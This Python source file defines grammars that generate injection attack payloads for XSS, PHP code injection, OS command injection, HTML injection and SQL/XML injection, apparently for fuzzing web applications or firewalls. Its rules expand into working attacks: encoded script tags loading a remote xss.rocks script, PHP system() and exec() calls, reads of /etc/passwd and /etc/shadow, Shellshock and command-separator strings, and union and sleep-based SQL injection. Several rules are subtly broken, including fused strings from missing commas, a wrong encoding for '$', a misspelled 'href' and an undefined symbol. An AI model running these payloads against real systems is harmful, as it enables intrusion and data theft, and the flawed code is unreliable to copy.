class PayloadDict(object):
    ### XSS Grammer ####
    ebnfXSS = {
        ### Injection Context ###
        'root': (('directContext',),
                 ('attributeContext',),
                 ('eventContext',)),
        'directContext': (('pre', 'leftSciptLabel', 'jsString', 'rightSciptLabel'),),
        'attributeContext': (('terDQuote', 'wsp', 'srcAttr', 'terEqual', 'jsStatement', 'wsp'),
                             ('pre', 'terLess', 'aTag', 'wsp', 'herfAttr', 'terEqual', 'jsStatement',
                              'wsp', 'terGreater', 'rightALabel'),
                             ('pre', 'terLess', 'iframeTag', 'wsp', 'srcAttr', 'terEqual', 'jsStatement',
                              'wsp', 'terGreater'),
                             ('pre', 'terLess', 'scriptTag', 'wsp', 'srcAttr', 'terEqual', 'jsFile',
                              'wsp', 'terGreater', 'rightSciptLabel')),
        'eventContext': (('terDQuote', 'wsp', 'eventStatement', 'wsp'),
                         ('pre', 'terLess', 'tagAttr', 'wsp', 'eventStatement', 'wsp', 'terGreater')),

        # Terminal
        'terDQuote': (("\"",),),
        'terSQuote': (("'",),),
        'terLess': (('<',),),
        'terGreater': (('>',),),
        'terEqual': (("=",),),
        'terBlank': (("[blank]",),
                     ('%20',)),
        'terSolidus': (("/",),
                       ('%2f',)),
        'terAdd': (("+",),),
        'terTab': (('%09',),),
        'terLF': (('%0A',),),
        'terFF': (('%0C',),),
        'terCR': (('%0D',),),

        # XSS Syntax-repairing
        'pre': (('terDQuote', 'terGreater'),
                ('terSQuote', 'terGreater'),
                ('terGreater',),
                ('terBlank',)),
        'wsp': (('terBlank',),
                ('terSolidus',),
                ('terAdd',),
                ('terTab',),
                ('terLF',),
                ('terFF',),
                ('terCR',)),

        ### XSS label ###
        'leftSciptLabel': (('terLess', 'scriptTag', 'terGreater'),),
        'rightSciptLabel': (('terLess', 'terSolidus', 'scriptTag', 'terGreater'),),
        'rightALabel': (('terLess', 'terSolidus', 'aTag', 'terGreater'),),

        ### XSS tag and attribute###
        'scriptTag': (('charS', 'charC', 'charR', 'charI', 'charP', 'charT'),),
        'aTag': (('charA',),),
        'iframeTag': (('charI', 'charF', 'charR', 'charA', 'charM', 'charE'),),
        'srcAttr': (('charS', 'charR', 'charC'),),
        'herfAttr': (('charH', 'charE', 'charR', 'charF',),),
        'tagAttr': (),

        # 'scriptTag': (('script',),),
        # 'aTag': (('a',),),
        # 'iframeTag': (('iframe',),),
        # 'srcAttr': (('src',),),
        # 'herfAttr': (('herf',),),
        # 'tagAttr': (),

        ###Javascript statement###
        'jsString': (('alert(1)',),
                     ('%61%6c%65%72%74%28%31%29',),
                     ('&#x61;&#6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',),
                     ('&#97;&#108;&#101;&#114;&#116&#40;&#57;&#41;&#59',)),
        'jsFile': (('http://xss.rocks/xss.js',),
                   ('%68%74%74%70%3A%2F%2F%78%73%73%2E%72%6F%63%6B%73%2F%78%73%73%2E%6A%73',),
                   ('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x78;&#x73;&#x73;&#x2E;&#x72;\
#&#x6F;&#x63;&#x6B;&#x73;&#x2F;&#x78;&#x73;&#x73;&#x2E;&#x6A;&#x73;',),
                   ('&#104&#116&#116&#112&#58&#47&#47&#120&#115&#115&#46&#114&#111&#99&#107&#115\
#&#47&#120&#115&#115&#46&#106&#115',)),
        'jsStatement': (('javascript:', 'jsString',),
                        ('%6A%61%76%61%73%63%72%69%70%74%3A', 'jsString',),
                        ('&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;', 'jsString',),
                        ('&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58', 'jsString',)),

        ### HTML event ###
        'eventStatement': (('eventAttr', 'terEqual', 'jsString'),),
        'eventAttr': (),

        ### Letter ###
        'charA': (('a',), ('%61',), ('%41',)),
        'charB': (('b',), ('%62',), ('%42',)),
        'charC': (('c',), ('%63',), ('%43',)),
        'charD': (('d',), ('%64',), ('%44',)),
        'charE': (('e',), ('%65',), ('%45',)),
        'charF': (('f',), ('%66',), ('%46',)),
        'charG': (('g',), ('%67',), ('%47',)),
        'charH': (('h',), ('%68',), ('%48',)),
        'charI': (('i',), ('%69',), ('%49',)),
        'charJ': (('j',), ('%6a',), ('%4a',)),
        'charK': (('k',), ('%6b',), ('%4b',)),
        'charL': (('l',), ('%6c',), ('%4c',)),
        'charM': (('m',), ('%6d',), ('%4d',)),
        'charN': (('n',), ('%6e',), ('%4e',)),
        'charO': (('o',), ('%6f',), ('%4f',)),
        'charP': (('p',), ('%70',), ('%50',)),
        'charQ': (('q',), ('%71',), ('%51',)),
        'charR': (('r',), ('%72',), ('%52',)),
        'charS': (('s',), ('%73',), ('%53',)),
        'charT': (('t',), ('%74',), ('%54',)),
        'charU': (('u',), ('%75',), ('%55',)),
        'charV': (('v',), ('%76',), ('%56',)),
        'charW': (('w',), ('%77',), ('%57',)),
        'charX': (('x',), ('%78',), ('%58',)),
        'charY': (('y',), ('%79',), ('%59',)),
        'charZ': (('z',), ('%7a',), ('%5a',)),
    }

    eventHandle = ['oncut', 'onblur', 'oncopy', 'ondrag', 'ondrop', 'onhelp', 'onload', 'onplay', 'onshow',
                   'onabort', 'onclick', 'onclose', 'onended', 'onerror', 'onfocus', 'oninput', 'onkeyup',
                   'onpaste', 'onpause', 'onreset', 'onwheel', 'onbounce', 'oncancel', 'onchange', 'onfinish',
                   'ononline', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onselect', 'onsubmit', 'ontoggle',
                   'onunload', 'oncanplay', 'ondragend', 'onemptied', 'onfocusin', 'oninvalid', 'onkeydown',
                   'onmessage', 'onmouseup', 'onoffline', 'onplaying', 'onseeking', 'onstalled', 'onstorage',
                   'onsuspend', 'onwaiting', 'onactivate', 'ondblclick', 'ondragover', 'onfocusout', 'onkeypress',
                   'onmouseout', 'onpagehide', 'onpageshow', 'onpopstate', 'onprogress', 'ontouchend', 'onbeforecut',
                   'oncuechange', 'ondragenter', 'ondragleave', 'ondragstart', 'onloadstart', 'onmousedown',
                   'onmousemove', 'onmouseover', 'ontouchmove', 'onafterprint', 'onbeforecopy', 'ongestureend',
                   'onhashchange', 'onloadeddata', 'onmouseenter', 'onmouseleave', 'onmousewheel', 'onratechange',
                   'ontimeupdate', 'ontouchstart', 'onafterupdate', 'onbeforepaste', 'onbeforeprint', 'oncontextmenu',
                   'ondevicelight', 'onmspointerup', 'ontouchcancel', 'onanimationend', 'onautocomplete',
                   'onbeforeunload', 'onbeforeupdate', 'ondevicemotion', 'ongesturestart', 'onmsgestureend',
                   'onmsgesturetap', 'onmspointerout', 'onvolumechange', 'oncontrolselect', 'ongesturechange',
                   'onmsgesturehold', 'onmspointerdown', 'onmspointermove', 'onmspointerover', 'ontransitionend',
                   'onuserproximity', 'onanimationstart', 'onbeforeactivate', 'oncanplaythrough', 'ondurationchange',
                   'onlanguagechange', 'onloadedmetadata', 'onmsgesturestart', 'onmsinertiastart', 'onmspointerenter',
                   'onmspointerhover', 'onmspointerleave', 'onbeforeeditfocus', 'ondeviceproximity',
                   'onmsgesturechange',
                   'onmspointercancel', 'onbeforedeactivate', 'onreadystatechange', 'onautocompleteerror',
                   'ondeviceorientation', 'onorientationchange', 'onanimationiteration', 'onmozfullscreenerror',
                   'onmsgesturedoubletap', 'onwebkitanimationend', 'onwebkitmouseforceup', 'onmozfullscreenchange',
                   'onmozpointerlockerror', 'onwebkittransitionend', 'onmozpointerlockchange', 'onwebkitanimationstart',
                   'onwebkitmouseforcedown', 'onwebkitwillrevealbottom', 'oncompassneedscalibration',
                   'onwebkitmouseforcechanged', 'onwebkitanimationiteration', 'onwebkitmouseforcewillbegin']
    tagHandle = ['a', 'b', 'i', 'p', 'q', 's', 'u', 'br', 'dd', 'dl', 'dt', 'em', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
                 'hr', 'li', 'ol', 'rp', 'rt', 'td', 'th', 'tr', 'tt', 'ul', 'bdi', 'bdo', 'big', 'col', 'del', 'dfn',
                 'dir', 'div', 'img', 'ins', 'kbd', 'map', 'nav', 'pre', 'sub', 'sup', 'svg', 'var', 'wbr', 'xmp',
                 'abbr', 'area', 'base', 'body', 'cite', 'code', 'font', 'form', 'head', 'html', 'link', 'main',
                 'mark', 'menu', 'meta', 'ruby', 'samp', 'span', 'time', 'aside', 'audio', 'embed', 'frame', 'image',
                 'input', 'label', 'meter', 'param', 'small', 'style', 'table', 'tbody', 'tfoot', 'thead', 'title',
                 'track', 'video', 'applet', 'button', 'canvas', 'center', 'dialog', 'figure', 'footer', 'header',
                 'iframe', 'keygen', 'legend', 'object', 'option', 'output', 'script', 'select', 'source', 'strike',
                 'strong', 'acronym', 'address', 'article', 'caption', 'details', 'isindex', 'listing', 'marquee',
                 'section', 'summary', 'basefont', 'colgroup', 'datalist', 'fieldset', 'frameset', 'menuitem',
                 'noframes', 'noscript', 'optgroup', 'progress', 'textarea', 'plaintext', 'blockquote', 'figcaption']

    ### PHPi Grammer ###
    ebnfPHPi = {
        ### Injection Context ###
        'root': (('evalContext',),
                 ('createFunctionContext',),
                 # ('replaceContext',),
                 ('serializeContext',)),
        'evalContext': (('attack',),
                        ('addslashesOpen', 'attack', 'addslashes')),
        'createFunctionContext': (('terDigitZero', 'functionClose', 'attack'),),
        # 'replaceContext': (('getPre', 'addslashesOpen', 'attack', 'addslashes'),
        #                   ('noGetPre', 'addslashesOpen', 'attack', 'addslashes')),
        'serializeContext': (('serializePre', 'serializePost'),),

        ### Terminal ###
        'addslashesOpen': (('char#', 'char{', 'char#', 'char{'),),
        'addslashes': (('char}', 'char}'),),
        'terDigitZero': (('0',),),
        'functionClose': (('char)', ';', 'char}'),),
        'serializePre': (('OorC', 'maohao', '[terDigitExcludingZero]', 'maohao', 'var'),),
        'serializePost': (('char{', 'zimu', 'maohao', '[terDigitExcludingZero]', 'maohao', 'attack'),),

        'OorC': (('charO',),
                 ('charC',),),
        'maohao': ((':',),),

        ### Attack ###
        'attack': (('phpPre', 'phpinfo()', 'phpPost'),
                   ('phpPre', 'echo[blank]"what"', 'phpPost'),
                   ('phpPre', '$fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo[blank]$result', 'phpPost'),
                   ('phpPre', "system('", "shell", "')", 'phpPost'),
                   ('phpPre', "exec('", "shell", "')", 'phpPost')),

        'phpPre': (('char<', '?', 'charP', 'charH', 'charP', 'wsp'), ('',)),
        'phpPost': (('wsp', '?', 'char>'), ('',)),

        'shell': (('/bin/cat', 'wsp', 'content'),
                  ('usr/bin/tail', 'wsp', 'content'), ('usr/bin/wget', 'wsp', '127.0.0.1'), ('usr/bin/who',),
                  ('usr/bin/whoami',), ('usr/local/bin/bash',),
                  ('usr/local/bin/curl' 'wsp', '127.0.0.1',), ('usr/local/bin/nmap',), ('usr/local/bin/python',),
                  ('usr/local/bin/ruby',), ('usr/local/bin/wget',),
                  ('usr/bin/nice',), ('usr/bin/less',), ('usr/bin/more',), ('ping', 'wsp', '127.0.0.1'),
                  ('sleep', 'wsp', '1')
                  , ('ls',), ('ifconfig',), ('netstat',), ('systeminfo',), ('which', 'wsp', 'curl')),
        'command': (('',), ('/etc/passwd',), ('/etc/shadow',)),

        ### Letter ###
        'charA': (('a',), ('%61',), ('%41',)),
        'charB': (('b',), ('%62',), ('%42',)),
        'charC': (('c',), ('%63',), ('%43',)),
        'charD': (('d',), ('%64',), ('%44',)),
        'charE': (('e',), ('%65',), ('%45',)),
        'charF': (('f',), ('%66',), ('%46',)),
        'charG': (('g',), ('%67',), ('%47',)),
        'charH': (('h',), ('%68',), ('%48',)),
        'charI': (('i',), ('%69',), ('%49',)),
        'charJ': (('j',), ('%6a',), ('%4a',)),
        'charK': (('k',), ('%6b',), ('%4b',)),
        'charL': (('l',), ('%6c',), ('%4c',)),
        'charM': (('m',), ('%6d',), ('%4d',)),
        'charN': (('n',), ('%6e',), ('%4e',)),
        'charO': (('o',), ('%6f',), ('%4f',)),
        'charP': (('p',), ('%70',), ('%50',)),
        'charQ': (('q',), ('%71',), ('%51',)),
        'charR': (('r',), ('%72',), ('%52',)),
        'charS': (('s',), ('%73',), ('%53',)),
        'charT': (('t',), ('%74',), ('%54',)),
        'charU': (('u',), ('%75',), ('%55',)),
        'charV': (('v',), ('%76',), ('%56',)),
        'charW': (('w',), ('%77',), ('%57',)),
        'charX': (('x',), ('%78',), ('%58',)),
        'charY': (('y',), ('%79',), ('%59',)),
        'charZ': (('z',), ('%7a',), ('%5a',)),
        'char$': (('$',), ('%23',)),
        'char{': (('{',), ('%7b',)),
        'char}': (('}',), ('%7d',)),
        'char(': (('(',), ('%28',)),
        'char)': ((')',), ('%29',)),
        'char<': (('<',), ('%3C',)),
        'char>': (('>',), ('%3E',)),
        'wsp': (('[blank]',), ('%20',), ('/**/',))
    }

    ### OS Command Injection Grammer ###
    ebnfOSi = {
        'root': (('pre', 'shell', 'post'),),

        'pre': (('var', 'post'),),
        'var': (('',), ('0',)),
        'post': ((';',), ('|',), ('||',), ('\n',), ('%0a',), ("'",), (')',), (');',), ('&',), ('$',), ('() { :;};',)),

        'shell': (('/bin/cat', 'wsp', 'content'),
                  ('usr/bin/tail', 'wsp', 'content'), ('usr/bin/wget', 'wsp', '127.0.0.1'), ('usr/bin/who',), ('usr/bin/whoami',), ('usr/local/bin/bash',),
                  ('usr/local/bin/curl' 'wsp', '127.0.0.1',), ('usr/local/bin/nmap',), ('usr/local/bin/python',), ('usr/local/bin/ruby',), ('usr/local/bin/wget',),
                  ('usr/bin/nice',), ('usr/bin/less',), ('usr/bin/more',), ('ping', 'wsp', '127.0.0.1'), ('sleep', 'wsp', '1')
                  , ('ls',), ('ifconfig',), ('netstat',), ('systeminfo',), ('which', 'wsp', 'curl')),
        'command': (('',), ('/etc/passwd',), ('/etc/shadow',)),

        'wsp': (('[blank]',), ('%20',))
    }

    ### HTMLi Grammer ####
    ebnfHTMLi = {
        ### Injection Context ###
        'root': (('iframe',),
                 ('img',),
                 ('form',),
                 ('a',),
                 ('video',),
                 ('embed',)),

        'iframe': (('terLess', 'iframeTag', 'wsp', 'srcAttr', 'terEqual', 'jsStatement',
                    'wsp', 'terGreater'),),
        'img': (('terLess', 'iframeImg', 'wsp', 'srcAttr', 'terEqual', 'jsStatement',
                 'wsp', 'terGreater'),),
        'form': (('terLess', 'iframeForm', 'wsp', 'actionAttr', 'terEqual', 'jsStatement', 'wsp',
                  'methodAttr', 'terEqual', 'methodContent', 'wsp', 'terGreater'),),
        'a': (('terLess', 'aTag', 'wsp', 'herfAttr', 'terEqual', 'jsStatement',
               'wsp', 'terGreater', 'rightALabel'),),
        'video': (('terLess', 'iframeVideo', 'wsp', 'srcAttr', 'terEqual', 'jsStatement',
                   'wsp', 'terGreater'),),
        'embed': (('terLess', 'iframeEmbed', 'wsp', 'srcAttr', 'terEqual', 'jsStatement',
                   'wsp', 'terGreater'),),

        ### Terminate ###
        'iframeTag': (('charI', 'charF', 'charR', 'charA', 'charM', 'charE'),),
        'iframeImg': (('charI', 'charM', 'charG'),),
        'actionAttr': (('charA', 'charC', 'charT', 'charI', 'charO', 'charN'),),
        'methodAttr': (('charM', 'charE', 'charT', 'charH', 'charO', 'charD'),),
        'methodContent': (('charG', 'charE', 'charT'), ('charP', 'charO', 'charS', 'charT')),
        'aTag': (('charA',),),
        'herfAttr': (('charH', 'charE', 'charR', 'charF',),),
        'tagAttr': (),
        'rightALabel': (('terLess', 'terSolidus', 'aTag', 'terGreater'),),
        'iframeVideo': (('charV', 'charI', 'charD', 'charE', 'charO'),),
        'iframeEmbed': (('charE', 'charM', 'charB', 'charE', 'charD'),),
        'wsp': (('terBlank',),
                ('terSolidus',),
                ('terAdd',),
                ('terTab',),
                ('terLF',),
                ('terFF',),
                ('terCR',)),
        'srcAttr': (('charS', 'charR', 'charC'),),
        'jsStatement': (('javascript:', 'jsString',),
                        ('%6A%61%76%61%73%63%72%69%70%74%3A', 'jsString',),
                        ('&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;', 'jsString',),
                        ('&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58', 'jsString',)),

        # Terminal
        'terDQuote': (("\"",),),
        'terSQuote': (("'",),),
        'terLess': (('char<',),),
        'terGreater': (('>',),),
        'terEqual': (("=",),),
        'terBlank': (("[blank]",),
                     ('%20',)),
        'terSolidus': (("/",),
                       ('%2f',)),
        'terAdd': (("+",),),
        'terTab': (('%09',),),
        'terLF': (('%0A',),),
        'terFF': (('%0C',),),
        'terCR': (('%0D',),),

        ### Letter ###
        'charA': (('a',), ('%61',), ('%41',)),
        'charB': (('b',), ('%62',), ('%42',)),
        'charC': (('c',), ('%63',), ('%43',)),
        'charD': (('d',), ('%64',), ('%44',)),
        'charE': (('e',), ('%65',), ('%45',)),
        'charF': (('f',), ('%66',), ('%46',)),
        'charG': (('g',), ('%67',), ('%47',)),
        'charH': (('h',), ('%68',), ('%48',)),
        'charI': (('i',), ('%69',), ('%49',)),
        'charJ': (('j',), ('%6a',), ('%4a',)),
        'charK': (('k',), ('%6b',), ('%4b',)),
        'charL': (('l',), ('%6c',), ('%4c',)),
        'charM': (('m',), ('%6d',), ('%4d',)),
        'charN': (('n',), ('%6e',), ('%4e',)),
        'charO': (('o',), ('%6f',), ('%4f',)),
        'charP': (('p',), ('%70',), ('%50',)),
        'charQ': (('q',), ('%71',), ('%51',)),
        'charR': (('r',), ('%72',), ('%52',)),
        'charS': (('s',), ('%73',), ('%53',)),
        'charT': (('t',), ('%74',), ('%54',)),
        'charU': (('u',), ('%75',), ('%55',)),
        'charV': (('v',), ('%76',), ('%56',)),
        'charW': (('w',), ('%77',), ('%57',)),
        'charX': (('x',), ('%78',), ('%58',)),
        'charY': (('y',), ('%79',), ('%59',)),
        'charZ': (('z',), ('%7a',), ('%5a',)),
        'char$': (('$',), ('%23',)),
        'char{': (('{',), ('%7b',)),
        'char}': (('}',), ('%7d',)),
        'char(': (('(',), ('%28',)),
        'char)': ((')',), ('%29',)),
        'char<': (('<',), ('%3C',)),
        'char>': (('>',), ('%3E',)),

    }

    ### XMLi Grammer ####
    ebnfXMLi = {
        ### Injection Context ###
        'root': (('numericContext',),
                 ('sQuoteContext',),
                 ('dQuoteContext',)),
        'numericContext': (('terDigitZero', 'wsp', 'booleanAttack', 'wsp'),
                           ('terDigitZero', 'par', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'parOpen', 'terDigitZero'),
                           ('terDigitZero', 'par', 'wsp', 'sqliAttack', 'cmt'),),
        'sQuoteContext': (('terSQuote', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'terSQuote'),
                          ('terSQuote', 'par', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'parOpen', 'terSQuote'),
                          ('terSQuote', 'par', 'wsp', 'sqliAttack', 'cmt')),
        'dQuoteContext': (('terDQuote', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'terDQuote'),
                          ('terDQuote', 'par', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'parOpen', 'terDQuote'),
                          ('terDQuote', 'par', 'wsp', 'sqliAttack', 'cmt')),
        'sqliAttack': (('unionAttack',),
                       ('piggyAttack',),
                       ('booleanAttack',)),

        ### Piggy-backed Attacks ###
        'piggyAttack': (('opSem', 'opSel', 'wsp', 'funcSleep'),),

        ### Union Attacks ###
        'cols': (('terDigitZero',),),
        'unionPostfix': (("all", 'wsp'),
                         ("distinct", 'wsp')),
        'unionConf': (('opUni',),
                      ('/*!', "50000", 'opUni', '*/')),
        'unionAttack': (('unionConf', 'wsp', 'unionPostfix', 'opSel', 'wsp', 'cols'),
                        ('unionConf', 'wsp', 'unionPostfix', 'parOpen', 'opSel', 'wsp', 'cols', 'par')),

        # boolean values which evaluate to false
        # falseConst = "false" | "fa" , [inlineCmt] , "lse";
        'falseConst': (('false',),),
        'falseAtom': (('wsp', 'falseConst'),
                      ('wsp', 'terDigitZero'),
                      ('terSQuote', 'terSQuote')),
        'unaryFalse': (('falseAtom',),
                       ('wsp', 'opNot', 'wsp', 'trueAtom'),
                       ('wsp', 'opNot', 'opBinInvert', 'falseAtom')),
        'booleanFalseExpr': (('unaryFalse',),),
        'orAttack': (('opOr', 'booleanTrueExpr'),),
        'andAttack': (('opAnd', 'booleanFalseExpr'),),
        'booleanAttack': (('orAttack',),
                          ('andAttack',)),

        ### Boolean-based Attacks ###
        # boolean values which evaluate to true
        # trueConst = "true" | "tr" , [inlineCmt] , "ue";
        'trueConst': (('true',),),
        'trueAtom': (('trueConst',),
                     ('terDigitOne',)),
        'unaryTrue': (('wsp', 'trueAtom'),
                      ('wsp', 'opNot', 'wsp', 'falseAtom'),
                      ('opBinInvert', 'wsp', 'falseAtom')),
        'binaryTrue': (('unaryTrue', 'opEqual', 'wsp', 'parOpen', 'unaryTrue', 'par'),
                       ('unaryFalse', 'opEqual', 'wsp', 'parOpen', 'unaryFalse', 'par'),
                       ('terSQuote', 'terChar', 'terSQuote', 'opEqual', 'terSQuote', 'terChar', 'terSQuote'),
                       ('terDQuote', 'terChar', 'terDQuote', 'opEqual', 'terDQuote', 'terChar', 'terDQuote'),
                       ('unaryFalse', 'opLt', 'parOpen', 'unaryTrue', 'par'),
                       ('unaryTrue', 'opGt', 'parOpen', 'unaryFalse', 'par'),
                       ('wsp', 'trueAtom', 'wsp', 'opLike', 'wsp', 'trueAtom'),
                       ('unaryTrue', 'wsp', 'opIs', 'wsp', 'trueConst'),
                       ('unaryFalse', 'wsp', 'opIs', 'wsp', 'falseConst'),
                       ('unaryTrue', 'opMinus', 'parOpen', 'unaryFalse', 'par')),
        'booleanTrueExpr': (('unaryTrue',),
                            ('binaryTrue',)),

        # Obfuscation
        'inlineCmt': (('/**/',),),
        'blank': (('[blank]',),),
        'wsp': (('blank',),
                ('inlineCmt',)),

        # Syntax-repairing
        'par': ((')',),),
        'cmt': (('#',),
                ('--', 'blank')),
        # SQL functions
        'parOpen': (('(',),),
        'funcSleep': (("sleep", 'parOpen', '[terDigitExcludingZero]', 'par'),),

        # SQL Operators and Keyword
        'opNot': (("!",),
                  ("not",)),
        'opBinInvert': (("~",),),
        'opEqual': (("=",),),
        'opLt': (("<",),),
        'opGt': ((">",),),
        'opLike': (("like",),),
        'opIs': (("is",),),
        'opMinus': (("-",),),
        'opOr': (("or",),
                 ("||",)),
        'opAnd': (("and",),
                  ("&&",)),
        'opSel': (("select",),),
        'opUni': (("union",),),
        'opSem': ((";",),),

        # 'terOne': (("1",),),
        'terSQuote': (("'",),),
        'terDQuote': (("\"",),),
        'terDigitZero': (("0",),),
        'terDigitOne': (("1",),),
        'terDigitExcludingZero': (("1",), ('2',), ('3',), ('4',), ('5',), ('6',), ('7',), ('8',), ('9',)),
        'terDigitIncludingZero': (("0",), ("1",), ('2',), ('3',), ('4',), ('5',), ('6',), ('7',), ('8',), ('9',)),
        'terChar': (("a",),),
    }

    ### SQLi Grammer ####
    ebnfSQLi = {
        ### Injection Context ###
        'root': (('numericContext',),
                 ('sQuoteContext',),
                 ('dQuoteContext',)),
        'numericContext': (('terDigitZero', 'wsp', 'booleanAttack', 'wsp'),
                           ('terDigitZero', 'par', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'parOpen', 'terDigitZero'),
                           ('terDigitZero', 'par', 'wsp', 'sqliAttack', 'cmt'),),
        'sQuoteContext': (('terSQuote', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'terSQuote'),
                          ('terSQuote', 'par', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'parOpen', 'terSQuote'),
                          ('terSQuote', 'par', 'wsp', 'sqliAttack', 'cmt')),
        'dQuoteContext': (('terDQuote', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'terDQuote'),
                          ('terDQuote', 'par', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'parOpen', 'terDQuote'),
                          ('terDQuote', 'par', 'wsp', 'sqliAttack', 'cmt')),
        'sqliAttack': (('unionAttack',),
                       ('piggyAttack',),
                       ('booleanAttack',)),

        ### Piggy-backed Attacks ###
        'piggyAttack': (('opSem', 'opSel', 'wsp', 'funcSleep'),),

        ### Union Attacks ###
        'cols': (('terDigitZero',),),
        'unionPostfix': (("all", 'wsp'),
                         ("distinct", 'wsp')),
        'unionConf': (('opUni',),
                      ('/*!', "50000", 'opUni', '*/')),
        'unionAttack': (('unionConf', 'wsp', 'unionPostfix', 'opSel', 'wsp', 'cols'),
                        ('unionConf', 'wsp', 'unionPostfix', 'parOpen', 'opSel', 'wsp', 'cols', 'par')),

        # boolean values which evaluate to false
        # falseConst = "false" | "fa" , [inlineCmt] , "lse";
        'falseConst': (('false',),),
        'falseAtom': (('wsp', 'falseConst'),
                      ('wsp', 'terDigitZero'),
                      ('terSQuote', 'terSQuote')),
        'unaryFalse': (('falseAtom',),
                       ('wsp', 'opNot', 'wsp', 'trueAtom'),
                       ('wsp', 'opNot', 'opBinInvert', 'falseAtom')),
        'booleanFalseExpr': (('unaryFalse',),),
        'orAttack': (('opOr', 'booleanTrueExpr'),),
        'andAttack': (('opAnd', 'booleanFalseExpr'),),
        'booleanAttack': (('orAttack',),
                          ('andAttack',)),

        ### Boolean-based Attacks ###
        # boolean values which evaluate to true
        # trueConst = "true" | "tr" , [inlineCmt] , "ue";
        'trueConst': (('true',),),
        'trueAtom': (('trueConst',),
                     ('terDigitOne',)),
        'unaryTrue': (('wsp', 'trueAtom'),
                      ('wsp', 'opNot', 'wsp', 'falseAtom'),
                      ('opBinInvert', 'wsp', 'falseAtom')),
        'binaryTrue': (('unaryTrue', 'opEqual', 'wsp', 'parOpen', 'unaryTrue', 'par'),
                       ('unaryFalse', 'opEqual', 'wsp', 'parOpen', 'unaryFalse', 'par'),
                       ('terSQuote', 'terChar', 'terSQuote', 'opEqual', 'terSQuote', 'terChar', 'terSQuote'),
                       ('terDQuote', 'terChar', 'terDQuote', 'opEqual', 'terDQuote', 'terChar', 'terDQuote'),
                       ('unaryFalse', 'opLt', 'parOpen', 'unaryTrue', 'par'),
                       ('unaryTrue', 'opGt', 'parOpen', 'unaryFalse', 'par'),
                       ('wsp', 'trueAtom', 'wsp', 'opLike', 'wsp', 'trueAtom'),
                       ('unaryTrue', 'wsp', 'opIs', 'wsp', 'trueConst'),
                       ('unaryFalse', 'wsp', 'opIs', 'wsp', 'falseConst'),
                       ('unaryTrue', 'opMinus', 'parOpen', 'unaryFalse', 'par')),
        'booleanTrueExpr': (('unaryTrue',),
                            ('binaryTrue',)),

        # Obfuscation
        'inlineCmt': (('/**/',),),
        'blank': (('[blank]',),),
        'wsp': (('blank',),
                ('inlineCmt',)),

        # Syntax-repairing
        'par': ((')',),),
        'cmt': (('#',),
                ('--', 'blank')),
        # SQL functions
        'parOpen': (('(',),),
        'funcSleep': (("sleep", 'parOpen', '[terDigitExcludingZero]', 'par'),),

        # SQL Operators and Keyword
        'opNot': (("!",),
                  ("not",)),
        'opBinInvert': (("~",),),
        'opEqual': (("=",),),
        'opLt': (("<",),),
        'opGt': ((">",),),
        'opLike': (("like",),),
        'opIs': (("is",),),
        'opMinus': (("-",),),
        'opOr': (("or",),
                 ("||",)),
        'opAnd': (("and",),
                  ("&&",)),
        'opSel': (("select",),),
        'opUni': (("union",),),
        'opSem': ((";",),),

        # 'terOne': (("1",),),
        'terSQuote': (("'",),),
        'terDQuote': (("\"",),),
        'terDigitZero': (("0",),),
        'terDigitOne': (("1",),),
        'terDigitExcludingZero': (("1",), ('2',), ('3',), ('4',), ('5',), ('6',), ('7',), ('8',), ('9',)),
        'terDigitIncludingZero': (("0",), ("1",), ('2',), ('3',), ('4',), ('5',), ('6',), ('7',), ('8',), ('9',)),
        'terChar': (("a",),),
    }

    def __init__(self):
        handlist = list()
        for i in self.eventHandle:
            temp = list(i)[:]
            for j in range(len(temp)):
                temp[j] = 'char' + temp[j].upper()
            handlist.append(tuple(temp))
        self.ebnfXSS['eventAttr'] = tuple(handlist)

        handlist = list()
        for i in self.tagHandle:
            temp = list(i)[:]
            for j in range(len(temp)):
                temp[j] = 'char' + temp[j].upper()
            handlist.append(tuple(temp))
        self.ebnfXSS['tagAttr'] = tuple(handlist)
